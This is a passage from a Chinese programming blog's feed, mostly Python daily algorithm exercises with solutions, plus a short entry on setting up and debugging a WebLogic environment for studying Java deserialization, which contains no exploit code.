number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> tmp_diff <span class="token operator">&lt;</span> diff<span class="token punctuation">:</span>            diff <span class="token operator">=</span> tmp_diff            index <span class="token operator">=</span> i    <span class="token keyword">return</span> index<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化--weblogic</title>
      <link href="//websecurity/java-fan-xu-lie-hua-weblogic/"/>
      <url>//websecurity/java-fan-xu-lie-hua-weblogic/</url>
      
        <content type="html"><![CDATA[<h1 id="一、搭建weblogic服务"><a href="#一、搭建weblogic服务" class="headerlink" title="一、搭建weblogic服务"></a>一、搭建weblogic服务</h1><ol><li><p>下载weblogic安装包</p><p>Oracle官网下载链接：<a href="https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html">https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html</a></p><p>可以找到多个版本安装包，Generic installer、 quick installer和Supplemental installer。</p><p>通用安装程序包括所有Oracle WebLogic Server和Oracle Coherence软件（包括示例），并且支持所有开发和生产目的。</p><p>快速安装程序用于开发目的。它包括所有Oracle WebLogic Server和Oracle Coherence运行时软件，但不包括示例和本地化的WebLogic控制台帮助文件。</p><p>补充安装程序可用于将示例和本地化的WebLogic控制台文件添加到使用快速安装程序创建的安装中。</p></li><li><p>jdk版本</p><p>不能使用openjdk安装 ，需要下载Oracle的jdk。</p><p>下载链接：<a href="https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html">https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html</a></p></li><li><p>安装weblogic，使用管理员身份安装weblogic</p><img src="/websecurity/java-fan-xu-lie-hua-weblogic/image-20210203154612576.png" class="" title="image-20210203154612576"></li></ol><h2 id="二、本地调试"><a href="#二、本地调试" class="headerlink" title="二、本地调试"></a>二、本地调试</h2><h3 id="配置idea本地调试环境"><a href="#配置idea本地调试环境" class="headerlink" title="配置idea本地调试环境"></a>配置idea本地调试环境</h3><ol><li><p>新建项目</p><img src="/websecurity/java-fan-xu-lie-hua-weblogic/image-20210203161507038.png" class="" title="image-20210203161507038"></li><li><p>配置configuration</p><img src="/websecurity/java-fan-xu-lie-hua-weblogic/image-20210203161755435.png" class="" title="image-20210203161755435"><p>使用maven创建项目时，可能会提示<code>warning no artifacts configured</code>错误，点击修复然后添加一个项目即可。</p><img src="/websecurity/java-fan-xu-lie-hua-weblogic/image-20210203162000812.png" class="" title="image-20210203162000812"></li></ol><h2 id="三、调试"><a href="#三、调试" class="headerlink" title="三、调试"></a>三、调试</h2><ol><li><p>添加要调试的资源</p><p>选择File -&gt; Project Structure</p><img src="/websecurity/java-fan-xu-lie-hua-weblogic/image-20210203162241069.png" class="" title="image-20210203162241069"><p>选择Libraries，然后添加jar包或文件</p><img src="/websecurity/java-fan-xu-lie-hua-weblogic/image-20210203162403563.png" class="" title="image-20210203162403563"></li><li><p>设置断点</p><p>连续按两次shift键可以调出搜索框</p><img src="/websecurity/java-fan-xu-lie-hua-weblogic/image-20210203162651813.png" class="" title="image-20210203162651813"><p>在合适位置下断点</p><img src="/websecurity/java-fan-xu-lie-hua-weblogic/image-20210203162721642.png" class="" title="image-20210203162721642"></li><li><p>使用poc触发断点</p><img src="/websecurity/java-fan-xu-lie-hua-weblogic/image-20210203162809374.png" class="" title="image-20210203162809374"><p>触发断点，可以进行调试了。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> websecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web security </tag>
            
            <tag> java 反序列化 </tag>
            
            <tag> weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day34</title>
      <link href="//code/python/pythontip-100days-day34/"/>
      <url>//code/python/pythontip-100days-day34/</url>
      
        <content type="html"><![CDATA[<h1 id="移动数组"><a href="#移动数组" class="headerlink" title="移动数组"></a>移动数组</h1><p>给定一个数组，将数组中的元素向右移动 k 个位置，其中 k 是非负数，要求使用空间复杂度为 O(1) 的原地算法</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">move_ele([1,2,3,4,5,6,7],3) -&gt; [5,6,7,1,2,3,4]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>输入参数均合法</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>将输入数组翻转两次</li></ol><h3 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">move_ele</span><span class="token punctuation">(</span>lst<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">,</span> k<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">list</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    1. 控制右边k个元素，放在列表左边    2. 使用pop()弹出元素，然后使用append()追加元素    :param lst:    :param k:    :return:    """</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> lst<span class="token punctuation">:</span>        <span class="token keyword">return</span> lst    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        lst<span class="token punctuation">.</span>append<span class="token punctuation">(</span>lst<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> lst<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">changxy</span><span class="token punctuation">(</span>lst<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">,</span> start<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> end<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    列表在范围内翻转    :param lst:    :param start:    :param end:    :return:    """</span>    <span class="token comment"># 判断结束位置是否越界</span>    end <span class="token operator">=</span> end <span class="token operator">-</span> <span class="token number">1</span> <span class="token keyword">if</span> end <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>lst<span class="token punctuation">)</span> <span class="token keyword">else</span> end    i<span class="token punctuation">,</span> j <span class="token operator">=</span> start<span class="token punctuation">,</span> end    <span class="token keyword">while</span> i <span class="token operator">&lt;=</span> j<span class="token punctuation">:</span>        lst<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> lst<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> lst<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> lst<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        i <span class="token operator">+=</span> <span class="token number">1</span>        j <span class="token operator">-=</span> <span class="token number">1</span><span class="token keyword">def</span> <span class="token function">move_ele</span><span class="token punctuation">(</span>lst<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">,</span> k<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">list</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    1. 前后两部分旋转    2. 整体旋转    :param lst:    :param k:    :return:    """</span>    <span class="token comment"># 前后两部分旋转</span>    changxy<span class="token punctuation">(</span>lst<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>lst<span class="token punctuation">)</span> <span class="token operator">-</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># lst[:len(lst)-k]</span>    changxy<span class="token punctuation">(</span>lst<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>lst<span class="token punctuation">)</span> <span class="token operator">-</span> k<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>lst<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># lst[-k:]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>lst<span class="token punctuation">)</span>    <span class="token comment"># 整体旋转</span>    changxy<span class="token punctuation">(</span>lst<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>lst<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>lst<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day33</title>
      <link href="//code/python/pythontip-100days-day33/"/>
      <url>//code/python/pythontip-100days-day33/</url>
      
        <content type="html"><![CDATA[<h1 id="实现字符串find"><a href="#实现字符串find" class="headerlink" title="实现字符串find"></a>实现字符串find</h1><p>实现字符串的<code>find</code>函数,返回字符串<code>source</code>中 子串<code>target</code>开始的位置， 从<code>start</code>索引开始搜索，如果可以找到多个，返回第一个,如果找不到返回-1</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">my_find('this is a book', 'this') -&gt; 0my_find('this is a book', 'this', start=1) -&gt; -1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li><code>source</code>,<code>target</code>一定为字符串类型</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>朴素的两重循环</li></ol><h3 id="解法："><a href="#解法：" class="headerlink" title="解法："></a>解法：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">my_find</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> target<span class="token punctuation">,</span> start<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    返回字符串source中 子串target开始的位置， 从start索引开始搜索    如果可以找到多个，返回第一个    :param source:    :param target:    :param start:    :return:    """</span>    <span class="token keyword">if</span> source <span class="token operator">==</span> <span class="token string">''</span> <span class="token keyword">or</span> target <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>source<span class="token punctuation">[</span>start<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 如果source的长度小于target的长度，返回-1</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>source<span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> start <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>source<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>        <span class="token keyword">if</span> source<span class="token punctuation">[</span>start <span class="token operator">+</span> i<span class="token punctuation">:</span>start <span class="token operator">+</span> i<span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> target<span class="token punctuation">:</span>            <span class="token keyword">return</span> start <span class="token operator">+</span> i    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法--最大公约数</title>
      <link href="//blogs/suan-fa-zui-da-gong-yue-shu/"/>
      <url>//blogs/suan-fa-zui-da-gong-yue-shu/</url>
      
        <content type="html"><![CDATA[<h3 id="最大公约数的定义"><a href="#最大公约数的定义" class="headerlink" title="最大公约数的定义"></a>最大公约数的定义</h3><p>最大公因数，也称最大<a href="https://baike.baidu.com/item/%E5%85%AC%E7%BA%A6%E6%95%B0">公约数</a>、最大公<a href="https://baike.baidu.com/item/%E5%9B%A0%E5%AD%90">因子</a>，指两个或多个<a href="https://baike.baidu.com/item/%E6%95%B4%E6%95%B0/1293937">整数</a>共有<a href="https://baike.baidu.com/item/%E7%BA%A6%E6%95%B0/8417882">约数</a>中最大的一个。<a href="https://baike.baidu.com/item/a/6337">a</a>，<a href="https://baike.baidu.com/item/b/3730447">b</a>的最大公约数记为（a，b），同样的，a，b，c的最大<a href="https://baike.baidu.com/item/%E5%85%AC%E7%BA%A6">公约</a>数记为（a，b，c），多个<a href="https://baike.baidu.com/item/%E6%95%B4%E6%95%B0/1293937">整数</a>的最大公约数也有同样的记号。求最大公约数有多种<a href="https://baike.baidu.com/item/%E6%96%B9%E6%B3%95/2444">方法</a>，常见的有<a href="https://baike.baidu.com/item/%E8%B4%A8%E5%9B%A0%E6%95%B0%E5%88%86%E8%A7%A3">质因数分解</a>法、<a href="https://baike.baidu.com/item/%E7%9F%AD%E9%99%A4%E6%B3%95/3640958">短除法</a>、<a href="https://baike.baidu.com/item/%E8%BE%97%E8%BD%AC%E7%9B%B8%E9%99%A4%E6%B3%95/4625352">辗转相除法</a>、<a href="https://baike.baidu.com/item/%E6%9B%B4%E7%9B%B8%E5%87%8F%E6%8D%9F%E6%B3%95/10277459">更相减损法</a>。与最大公约数相对应的概念是<a href="https://baike.baidu.com/item/%E6%9C%80%E5%B0%8F%E5%85%AC%E5%80%8D%E6%95%B0/6192375">最小公倍数</a>，a，b的<a href="https://baike.baidu.com/item/%E6%9C%80%E5%B0%8F%E5%85%AC%E5%80%8D%E6%95%B0/6192375">最小公倍数</a>记为[a，b]。</p><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3>]]></content>
      
      
      <categories>
          
          <category> blogs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 最大公约数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day32</title>
      <link href="//code/python/pythontip-100days-day32/"/>
      <url>//code/python/pythontip-100days-day32/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>实现函数is_startswith，如果字符串source是以substr开头的，则函数返回True,反之返回False</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">is_startswith('python','py') -&gt; Trueis_startswith('python','java') -&gt; False<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>输入一定为字符串类型</li><li>输入可能为空串</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>首先要判断传入的参数是否合法，这里默认传入的都是字符串，那么我们要需要判断字符串是否有空串的情况</li><li>如果substr的长度大于source的长度，直接返回False</li><li>从索引0开始，遍历substr,从source上获得相同索引的字符，两者进行比较，只要有一个字符不相同，则可以立即返回False</li></ol><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">is_startswith</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> substr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    判断字符串source是否以substr开头    :param source:    :param substr:    :return:    """</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> source <span class="token keyword">or</span> <span class="token keyword">not</span> substr<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>substr<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>source<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> index<span class="token punctuation">,</span> item <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>substr<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> item <span class="token operator">!=</span> source<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>  <span class="token comment"># 如果for循环不是因为break结束的，就会进入到else语句块</span>    <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n)</code></li><li>空间复杂度<code>O(n)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>首先要判断传入的参数是否合法，这里默认传入的都是字符串，那么我们要需要判断字符串是否有空串的情况</li><li>如果substr的长度大于source的长度，直接返回False</li><li>从索引0开始，遍历substr,从source上获得相同索引的字符，两者进行比较，只要有一个字符不相同，则可以立即返回False</li></ol>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day31</title>
      <link href="//code/python/pythontip-100days-day31/"/>
      <url>//code/python/pythontip-100days-day31/</url>
      
        <content type="html"><![CDATA[<h1 id="实现函数is-startswith"><a href="#实现函数is-startswith" class="headerlink" title="实现函数is_startswith"></a>实现函数is_startswith</h1><p>实现函数is_startswith，如果字符串source是以substr开头的，则函数返回True,反之返回False</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">is_startswith('python','py') -&gt; Trueis_startswith('python','java') -&gt; False<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>输入一定为字符串类型</li><li>输入可能为空串</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>首先要判断传入的参数是否合法，这里默认传入的都是字符串，那么我们要需要判断字符串是否有空串的情况</li><li>如果substr的长度大于source的长度，直接返回False</li><li>从索引0开始，遍历substr,从source上获得相同索引的字符，两者进行比较，只要有一个字符不相同，则可以立即返回False</li></ol><h3 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">is_startswith</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> substr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> source <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> source <span class="token operator">==</span> <span class="token string">''</span> <span class="token keyword">or</span> substr <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> substr <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>source<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>substr<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> substr <span class="token operator">==</span> source<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>substr<span class="token punctuation">)</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day30</title>
      <link href="//code/python/pythontip-100days-day30/"/>
      <url>//code/python/pythontip-100days-day30/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>珂珂喜欢吃香蕉。这里有 N 堆香蕉，第 i 堆中有 piles[i] 根香蕉。警卫已经离开了，将在 H 小时后回来。</p><p>珂珂可以决定她吃香蕉的速度 K （单位：根/小时）。每个小时，她将会选择一堆香蕉，从中吃掉 K 根。如果这堆香蕉少于 K 根，她将吃掉这堆的所有香蕉，然后这一小时内不会再吃更多的香蕉。</p><p>珂珂喜欢慢慢吃，但仍然想在警卫回来前吃掉所有的香蕉。</p><p>返回她可以在 H 小时内吃掉所有香蕉的最小速度 K（K 为整数）。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">minEatingSpeed([3,6,7,11],8) -&gt; 4minEatingSpeed([30,11,23,4,20],5) -&gt; 30minEatingSpeed([30,11,23,4,20],6) -&gt; 23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>输入的参数不为空</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>二分查找</li></ol><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">minEatingSpeed</span><span class="token punctuation">(</span>piles<span class="token punctuation">,</span> H<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">possible</span><span class="token punctuation">(</span>K<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        p-1 是为了制造一种状态，破化p整除K时，会+1；但是p-1整除K时，实际上p不能整除，还是得加1        :param K:        :return:        """</span>        <span class="token keyword">return</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> K <span class="token operator">+</span> <span class="token number">1</span> <span class="token keyword">for</span> p <span class="token keyword">in</span> piles<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> H    lo<span class="token punctuation">,</span> hi <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">max</span><span class="token punctuation">(</span>piles<span class="token punctuation">)</span>    <span class="token keyword">while</span> lo <span class="token operator">&lt;</span> hi<span class="token punctuation">:</span>        mi <span class="token operator">=</span> <span class="token punctuation">(</span>lo <span class="token operator">+</span> hi<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> possible<span class="token punctuation">(</span>mi<span class="token punctuation">)</span><span class="token punctuation">:</span>            lo <span class="token operator">=</span> mi <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            hi <span class="token operator">=</span> mi    <span class="token keyword">return</span> lo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(nlogn)</code></li><li>空间复杂度<code>O(1)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>二分查找</li></ol>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day29</title>
      <link href="//code/python/pythontip-100days-day29/"/>
      <url>//code/python/pythontip-100days-day29/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">singleNumber([2,2,1]) -&gt; 1singleNumber([4,1,2,1,2]) -&gt; 4 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>输入的参数不为空</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>你能想到不使dict的方法吗</li></ol><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> functools <span class="token keyword">import</span> <span class="token builtin">reduce</span><span class="token keyword">def</span> <span class="token function">singleNumber</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">reduce</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> x <span class="token operator">^</span> y<span class="token punctuation">,</span> nums<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n)</code></li><li>空间复杂度<code>O(1)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>异或运算</li></ol>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day28</title>
      <link href="//code/python/pythontip-100days-day28/"/>
      <url>//code/python/pythontip-100days-day28/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个 n × n 的二维矩阵,将其顺时针旋转90度</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">rotateMatrix([[1,2,3],[4,5,6],[7,8,9]]) -&gt; [[7,4,1],[8,5,2],[9,6,3]]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>输入的参数不为空</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>你能想到不使用额外二维数组的方法吗？</li></ol><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">rotateMatrix</span><span class="token punctuation">(</span>matrix<span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>matrix<span class="token punctuation">)</span>    <span class="token comment"># 